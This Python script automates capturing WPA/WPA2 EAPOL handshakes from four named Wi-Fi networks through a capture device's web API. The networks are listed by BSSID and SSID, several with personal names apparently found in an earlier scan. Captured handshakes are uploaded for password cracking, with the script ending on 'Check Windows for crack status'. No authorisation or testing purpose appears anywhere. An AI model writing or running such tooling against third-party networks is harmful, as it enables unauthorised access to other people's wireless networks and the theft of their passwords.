"""Try capturing EAPOL from multiple networks."""
import requests, time

HOST = "192.168.1.102"

# Networks to try (from earlier scan)
networks = [
    {"bssid": "a2:ad:9f:f3:38:20", "ssid": "Kurt Home"},
    {"bssid": "3c:7c:3f:f6:e5:8c", "ssid": "TP-LINK_lucien_5G"},
    {"bssid": "00:31:92:33:80:22", "ssid": "Han_5G"},
    {"bssid": "f8:34:5a:8c:1f:9f", "ssid": "BruceWen-5G"},
]

for i, net in enumerate(networks):
    print(f"\n[{i+1}/{len(networks)}] Trying {net['ssid']} ({net['bssid']})...")
    
    # Start capture
    r = requests.post(
        f"http://{HOST}:8765/api/capture",
        params={
            "bssid": net['bssid'],
            "ssid": net['ssid'],
            "duration": 45
        },
        timeout=10
    )
    print(f"  Response: {r.json()}")
    
    # Poll
    result = None
    for j in range(10):  # 50s / 5s
        time.sleep(5)
        try:
            r = requests.get(f"http://{HOST}:8765/api/state", timeout=5)
            d = r.json()
            print(f"  [{(j+1)*5}s] {d['status']} - {d['message']}")
            
            if d['status'] == 'idle' and d.get('capture_file'):
                result = d
                break
        except:
            print(f"  [{(j+1)*5}s] timeout")
    
    if result:
        eapol_target = result.get('capture_eapol_target', 0)
        print(f"  EAPOL target: {eapol_target}")
        
        if eapol_target > 0:
            print("  ✓ Got EAPOL! Uploading...")
            r = requests.post(f"http://{HOST}:8765/api/upload", timeout=10)
            print(f"  Upload: {r.json()}")
            
            # Poll upload
            for k in range(10):
                time.sleep(3)
                r = requests.get(f"http://{HOST}:8765/api/state", timeout=5)
                d = r.json()
                print(f"  [{(k+1)*3}s] {d['status']} - {d['message']}")
                if d['status'] == 'idle' and d.get('upload_status') == 'success':
                    break
            print("\n✓ Done! Check Windows for crack status.")
            break
    else:
        print("  ✗ No capture file")
